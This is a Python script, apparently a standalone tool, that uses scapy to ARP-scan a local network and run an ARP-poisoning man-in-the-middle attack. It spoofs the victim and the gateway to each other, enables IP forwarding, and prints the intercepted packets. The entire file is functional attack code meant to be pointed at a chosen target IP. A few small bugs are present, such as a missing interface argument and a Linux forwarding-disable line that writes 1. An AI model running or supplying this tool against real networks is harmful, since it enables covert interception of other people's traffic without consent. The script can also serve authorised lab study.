import logging 
import argparse
import sys
import time
from threading import Thread

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *


MY_MAC = ""
MY_IP = ""

GATEWAY_MAC = ""
_SRC_DST = {}
STOP_SNIFF = ""


def arp_scan(ip, interface):
    """
    Performs a network scan by sending ARP requests to an IP address or a range of IP addresses.
    Args:
        ip (str): An IP address or IP address range to scan. For example:
                    - 192.168.1.1 to scan a single IP address
                    - 192.168.1.1/24 to scan a range of IP addresses.
    Returns:
        A list of dictionaries mapping IP addresses to MAC addresses. For example:
        [
            {'IP': '192.168.2.1', 'MAC': 'c4:93:d9:8b:3e:5a'}
        ]
    """
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)

    ans, unans = srp(request, timeout=2, retry=1, verbose=0, iface=interface)
    result = []

    for sent, received in ans:
        result.append({'IP': received.psrc, 'MAC': received.hwsrc})

    return result


def arp_spoof(targetIP, spoofIP, spoofMAC):
    """
    Performs an ARP spoofing attack against the target IP.
    Args:
        targetIP (str): An IP address to target.
        spoofIP (str): An IP address to spoof as.
        spoofMAC (str): The spoofed MAC address.
    """
    packet=ARP(op=2, pdst=targetIP, psrc=spoofIP, hwsrc=spoofMAC)
    send(packet, verbose=False)


def arp_restore(destinationIP, sourceIP, destinationMAC, sourceMAC):
    """
    Restores the ARP cache after an ARP spoofing attack.
    Args:
        destinationIP (str): The target IP address.
        sourceIP (str): The IP address of the original host to be restored.
        destinationMAC (str): The target MAC address.
        sourceMAC (str): The MAC address of the original host to be restored.
    """
    packet = ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
    send(packet, count=4,verbose=False)


def set_ip_forwarding(set):
    if set:
        #for OSX
        os.system('sysctl -w net.inet.ip.forwarding=1')

        #for Linux
        #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    else:
        #for OSX
        os.system('sysctl -w net.inet.ip.forwarding=0')

        #for Linux
        #os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')


def sniff_parser(packet):
    if IP in packet:
        print(packet.summary())


def sniffer_thread(targetMAC, gatewayMAC):
    while not STOP_SNIFF:
        sniff(
            prn=sniff_parser,
            filter=f"ip and (ether src {targetMAC} or ether src {gatewayMAC})",
            count=2
        )


def arp_mitm(targetIP, gatewayIP, targetMAC, gatewayMAC, myMAC):
    global STOP_SNIFF

    packets = 0

    # Start packet forwarding thread
    print("[+] Packet forwarding enabled.")
    set_ip_forwarding(1)

    print("[+] Starting Packet Sniff.")
    sniffer = Thread(target = sniffer_thread, args = (targetMAC, gatewayMAC))
    sniffer.start()

    time.sleep(5)

    # Begin ARP MITM attack
    print("[+] ARP MITM attack started.")
    try:
        while True:
            
            # Tell victim machine that I am the router.
            arp_spoof(targetIP, gatewayIP, myMAC)

            # Tell router that I am the victim machine.
            arp_spoof(gatewayIP, targetIP, myMAC)

            packets +=2
            if packets % 10 == 0:
                print("\r[+] Sent packets "+ str(packets)),
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print("[+] Interrupt detected, restoring to original state.")

        # Restore ARP cache
        arp_restore(targetIP, gatewayIP, targetMAC, gatewayMAC)
        arp_restore(gatewayIP, targetIP, gatewayMAC, targetMAC)

        print("[+] Packet forwarding disabled.")
        set_ip_forwarding(0)

        print("[+] Stopping Packet Sniff.")
        STOP_SNIFF = True
        sniffer.join()


def main():
    global GATEWAY_MAC, _SRC_DST, MY_MAC, MY_IP

    parser = argparse.ArgumentParser()

    parser.add_argument(
        '-i', '--interface', default=conf.iface, help='Interface to use.'
    )

    subparsers = parser.add_subparsers(
        dest="command", help="Command to perform.", required=True
    )

    discover_subparser = subparsers.add_parser(
        'discover', help='Perform an ARP scan to discover endpoints.'
    )
    discover_subparser.add_argument(
        'IP', help='An IP address (e.g. 192.168.1.1) or address range (e.g. 192.168.1.1/24) to scan.'
    )

    attack_subparser = subparsers.add_parser(
        'attack', help='Perform an ARP poisining MITM attack.'
    )
    attack_subparser.add_argument(
        'target', help='Target IP address.'
    )
    attack_subparser.add_argument(
        'gateway', help='Gateway IP address.'
    )

    args = parser.parse_args()

    MY_MAC = get_if_hwaddr(args.interface)
    MY_IP = get_if_addr(args.interface)

    print(f"My MAC: {MY_MAC}\nMy IP: {MY_IP}")
    print()

    if args.command == 'discover':
        print(f"[+] Scanning {args.IP}...")
        result = arp_scan(args.IP, args.interface)
        ip_to_MAC = {}

        for mapping in result:
            print(f"\t{mapping['IP']} => {mapping['MAC']}")
            ip_to_MAC[mapping['IP']] = mapping['MAC']

    elif args.command == 'attack':
        print(f"[+] Determining target and gateway MAC address.")
        
        result = arp_scan(args.target, args.interface)
        if not result:
            print("\tCannot determine target MAC address. Are you sure the IP is correct?")
            sys.exit(1)
        else:
            targetMAC = result[0]['MAC']
        
        result = arp_scan(args.gateway)
        if not result:
            print("\tCannot determine gateway MAC address. Are you sure the IP is correct?")
            sys.exit(1)
        else:
            gatewayMAC = result[0]['MAC']
    
        # Define packet forwarding source and destination
        GATEWAY_MAC = gatewayMAC
        _SRC_DST = {
            gatewayMAC: targetMAC,
            targetMAC: gatewayMAC,
        }

        print(f"[+] Performing ARP poisining MITM.")
        arp_mitm(args.target, args.gateway, targetMAC, gatewayMAC, MY_MAC)


if __name__ == '__main__':
    main()